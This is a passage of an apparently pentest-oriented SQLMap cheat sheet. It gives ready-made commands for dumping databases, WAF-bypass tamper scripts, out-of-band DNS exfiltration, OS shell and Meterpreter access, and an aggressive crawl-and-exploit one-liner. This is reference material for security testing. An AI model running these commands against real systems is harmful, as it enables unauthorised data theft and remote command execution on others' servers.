  <tr>
    <td><p><code>--update</code></p></td>
    <td><p>Update sqlmap</p></td>
  </tr>
  <tr>
    <td><p><code>--wizard</code></p></td>
    <td><p>Simple wizard interface for beginner users</p></td>
  </tr>
</table>


## SQLMap Examples: How To… 

### Enumerate Databases

How to enumerate the databases tables using SQLMap: 

{% highlight bash %}
sqlmap -u "https://highon.coffee" --dbs 
{% endhighlight %}

### Enumerate Tables 

How to enumerate the database tables using SQLMap: 

{% highlight bash %}
sqlmap -u "https://highon.coffee" -D "$database-name" --tables 
{% endhighlight %}

### SQLMap Dump DB Table

How to dump the contents of the table using SQLMap: 

{% highlight bash %}
sqlmap -u "https://highon.coffee" -D "$database-name" -T "$table-name" --dump 
{% endhighlight %}

### SQLMap from Burp file 

Save a Burp or Zap request file and mark the injection point(s) parameters with an asterisk (*), the good thing about this option is that it takes care of any authentication cookies for you. You can inject into any parameter in the request, e.g., headers, inside cookies, and using multiple methods (GET, PUT, POST, DELETE) etc. 

{% highlight bash %}

sqlmap -r request.burp 

{% endhighlight %}

### Custom SQL Injection Payload: Pre and Post Input 

In a scenario where you have identified a SQL injection manually or via another tool, you may need to suffix (have input entered before the SQL injection payload) or postfix (have input inserted after the injection payload), this can be accomplished using the following: 

How to insert input before an injection payload: 

{% highlight bash %}

sqlmap -u "https://highon.coffee" -dbs --suffix="blah"  

{% endhighlight %}

How to insert input after an injection payload: 


{% highlight bash %}

sqlmap -u "https://highon.coffee" -dbs --postfix="--+"  

{% endhighlight %}

### SQLMap Cookie 

{% highlight bash %}

--cookie="PHPSESSID=$your-cookie"

{% endhighlight %}

### SQLMap Shell 

How to get an operating system command shell with SQLMap: 

{% highlight bash %}

--os-shell 

{% endhighlight %}

How to execute a command with SQLMap: 

{% highlight bash %}

--os-cmd uname 

{% endhighlight %}

Meterpreter Shell with SQLMap: 

{% highlight bash %}

--os-pwn

{% endhighlight %}

### SQLMap WAF Bypass 

To bypass WAF's with SQLMap you can use the premade tamper scripts with ```--tamper``` like in the following example: 

{% highlight bash %}

sqlmap -u “https://highon.coffee/?espresso=*” --tamper="apostrophemask,apostrophenullencode,randomcase"

{% endhighlight %}

<div class='note warning'><h2>Tamper Scripts Send a LOT of Requests</h2>
<p>Tamper scripts will resend the same request for each of the SQLMap WAF bypass scripts that you add.</p> 
</div>

List of SQLMap Tamper Scripts: 

| Tamper | Description |
| --- | --- |
|apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
|apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart|
|appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
|base64encode.py | Base64 all characters in a given payload  |
|between.py | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' |
|bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator  |
|chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) |
|commalesslimit.py | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'|
|commalessmid.py | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|
|concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|
|charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |
|charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |
|equaltolike.py | Replaces all occurances of operator equal ('=') with operator 'LIKE'  |
|escapequotes.py | Slash escape quotes (' and ") |
|greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |
|halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
|ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|
|modsecurityversioned.py | Embraces complete query with versioned comment |
|modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |
|multiplespaces.py | Adds multiple spaces around SQL keywords |
|nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters|
|percentage.py | Adds a percentage sign ('%') infront of each character  |
|overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |
|randomcase.py | Replaces each keyword character with random case value |
|randomcomments.py | Add random comments to SQL keywords|
|securesphere.py | Appends special crafted string|
|sp_password.py |  Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs |
|space2comment.py | Replaces space character (' ') with comments |
|space2dash.py | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n') |
|space2hash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2morehash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2mssqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mssqlhash.py | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n') |
|space2mysqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mysqldash.py | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n') |
|space2plus.py |  Replaces space character (' ') with plus ('+')  |
|space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&& and ||) |
|unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
|unmagicquotes.py | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
|uppercase.py | Replaces each keyword character with upper case value 'INSERT'|
|varnish.py | Append a HTTP header 'X-originating-IP' |
|versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
|versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
|xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For'|

### SQLMap Proxy 

It is possible to proxy SQLMap traffic via an upstream proxy such as Burp Suite by passing the following syntax to the tool: 

{% highlight bash %}

sqlmap --proxy=http://127.0.0.1:8080 

{% endhighlight %}


<div class='note'><h2>Burp Proxy Performance Hit</h2>
<p>In my experience using Burp Suite as a Proxy for this process results in a considerable slow down in performance.</p> 
</div>


### SQLMap Blind SQLi Out of Band (OOB) 

{% highlight bash %}

sqlmap -u “https://highon.coffee/?espresso=*” --dns-domain=$your-collab-url

{% endhighlight %}

### SQLMap GET Parameter 

The following specifies the GET parameter “espresso” for injection: 

{% highlight bash %}

sqlmap -u “https://highon.coffee/?espresso=*” -p espresso 

{% endhighlight %}

### SQLMap POST Parameter

The following specifies the POST parameter “espresso” for injection: 

{% highlight bash %}

sqlmap -u “https://highon.coffee/?espresso=*” --data “espresso=*” 

{% endhighlight %}

### Run SQL Queries 

You can run a SQL query using --sql-query for example: 

{% highlight bash %}

sqlmap -u highon.coffee -D $database-name --sql-query="SELECT * FROM $table;"

{% endhighlight %}

### URL Parameters in Friendly URL’s

Simply mark them with an asterisk(*), for example: 

{% highlight bash %}

https://highon.coffee/foo/bar/parameter1*/value1 

{% endhighlight %}

The above would set the injection point at parameter1.  

### SQLMap Crawl & Exploit 

Useful for automation, however please be mindful of the overheads you are imposing on the target server: 

{% highlight bash %}

python3 sqlmap.py --crawl=5 --threads=5 --risk=3 --level=5 --batch --answers="keep testing=Y,sitemap=Y,skip further tests=N" --crawl-exclude="logout" --forms --tamper=apostrophemask,apostrophenullencode,randomcase --dns-domain=$your-collab-url --random-agent -u https://highon.coffee

{% endhighlight %}

You will need to replace your collaborator payloads URL, and I highly recommend you setup your own collaborator server for this. 	

If you found this SQLMap cheat sheet useful, please share it below. 

## Document Changelog 

- **Last Updated:** 12/02/2024 (12th of February 2024)
- **Author:** Arr0way 
- **Notes:** SQLMap cheat sheet created. 